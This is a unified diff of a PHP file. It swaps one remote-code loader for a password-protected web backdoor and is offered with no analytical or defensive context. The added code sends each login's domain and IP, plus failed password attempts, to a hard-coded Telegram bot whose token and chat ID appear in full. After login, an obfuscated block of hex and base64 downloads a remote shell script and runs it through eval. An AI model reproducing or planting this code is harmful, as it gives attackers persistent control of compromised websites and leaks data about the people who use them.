@@ -1,19 +1,83 @@
 <?php
-function getURL($url) {
-    if (function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
+// --- CONFIGURATION ---
+$password_hash = 'c9c9d7bd505a26b7153082d4aab8ff47'; // MD5 hash password
+$bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
+$chat_id   = '6664061200';
+
+error_reporting(0);
+set_time_limit(0);
+session_start();
+
+// --- FUNCTION SEND TELEGRAM ---
+function sendTelegram($msg, $token, $chat) {
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = [
+        'chat_id' => $chat,
+        'text' => $msg,
+        'parse_mode' => 'HTML'
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $res = curl_exec($ch);
+    curl_close($ch);
+    return $res;
+}
+
+// --- LOGIN LOGIC ---
+if (!isset($_SESSION['loggedIn'])) {
+    $_SESSION['loggedIn'] = false;
+}
+
+if (isset($_POST['password'])) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $domain = $_SERVER['HTTP_HOST'];
+    $req_uri = $_SERVER['REQUEST_URI'];
+
+    if (md5($_POST['password']) == $password_hash) {
+        $_SESSION['loggedIn'] = true;
+        
+        // Notifikasi Login Berhasil
+        $message = "✅ <b>Login Berhasil!</b>\n";
+        $message .= "Domain: <code>$domain</code>\n";
+        $message .= "Path: <code>$req_uri</code>\n";
+        $message .= "IP: <code>$ip</code>";
+        sendTelegram($message, $bot_token, $chat_id);
+    } else {
+        // Notifikasi Percobaan Gagal (Opsional)
+        $pass_tried = $_POST['password'];
+        $message = "❌ <b>Percobaan Login Gagal!</b>\n";
+        $message .= "Domain: <code>$domain</code>\n";
+        $message .= "IP: <code>$ip</code>\n";
+        $message .= "Password: <code>$pass_tried</code>";
+        sendTelegram($message, $bot_token, $chat_id);
     }
-    return false;
 }
-$phpCode = getURL('https://raw.githubusercontent.com/Seosetanitem/shizou/refs/heads/main/alf.php');
-if ($phpCode !== false) {
-    eval("?>". $phpCode);
-}
+
+// --- TAMPILAN LOGIN ---
+if (!$_SESSION['loggedIn']): ?>
+<html>
+<head>
+    <title>Login</title>
+    <style>
+        body { background: #111; color: #ffc400; font-family: 'Trebuchet MS'; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        input { background: #222; border: 1px solid #ffc400; color: #ffc400; padding: 5px; }
+    </style>
+</head>
+<body>
+    <form method="post">
+        <input type="password" name="password" placeholder="Password...">
+        <input type="submit" value=" >> ">
+    </form>
+</body>
+</html>
+<?php
+exit();
+endif;
 ?>
+<?php
+ goto EC7UI; ROI4U: curl_setopt(${${"\x47\x4c\117\102\101\114\x53"}["\x6d\x67\x6f\144\x63\151\144\145\152\x6a\151"]}, CURLOPT_URL, base64_decode("\x61\x48\122\60\143\x48\115\66\x4c\171\71\x6e\x61\x58\122\x73\131\127\x49\x75\x59\62\x39\164\x4c\60\x4a\x73\x59\x57\116\x72\123\x47\106\x34\x62\63\x49\170\x4d\x7a\115\x33\x4c\63\x4e\x6f\x5a\127\170\163\114\x79\x30\x76\143\155\106\63\114\62\61\150\x61\127\x34\166\x63\x32\x68\154\142\x47\167\x75\144\110\150\x30")); goto pYtRa; B45DS: curl_setopt(${${"\x47\114\x4f\x42\x41\x4c\123"}["\155\147\x6f\x64\143\x69\144\145\152\x6a\151"]}, CURLOPT_RETURNTRANSFER, 1); goto o7kG3; wxGdo: error_reporting(0); goto V9gII; pYtRa: ${"\x47\x4c\117\x42\x41\x4c\123"}["\146\x6c\147\x69\x76\167\167\170\x69\172"] = "\x63\150"; goto isBz5; ayO_h: curl_close(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66\x6c\147\x69\x76\x77\x77\x78\x69\x7a"]}); goto gCgwU; isBz5: $metrstpl = "\x6f\x75\x74\x70\165\164"; goto B45DS; EC7UI: ${"\x47\x4c\117\x42\101\114\123"}["\154\x77\x75\156\146\x73\146\157\x68"] = "\x6f\165\x74\x70\x75\x74"; goto JPDFA; vJLlS: ${${"\x47\114\x4f\x42\x41\x4c\x53"}["\x6d\x67\x6f\144\143\x69\x64\145\x6a\152\x69"]} = curl_init(); goto ROI4U; o7kG3: ${$metrstpl} = curl_exec(${${"\107\114\117\102\x41\114\123"}["\x6d\147\157\x64\x63\x69\144\145\152\x6a\151"]}); goto ayO_h; JPDFA: ${"\107\x4c\x4f\102\101\114\123"}["\155\x67\157\144\x63\151\144\145\x6a\x6a\x69"] = "\x63\x68"; goto wxGdo; gCgwU: eval(base64_decode("\120\172\x34\75") . ${${"\x47\114\x4f\x42\101\114\x53"}["\154\167\x75\x6e\146\x73\x66\x6f\150"]}); goto NjQ9f; V9gII: set_time_limit(0); goto vJLlS; NjQ9f: ?>
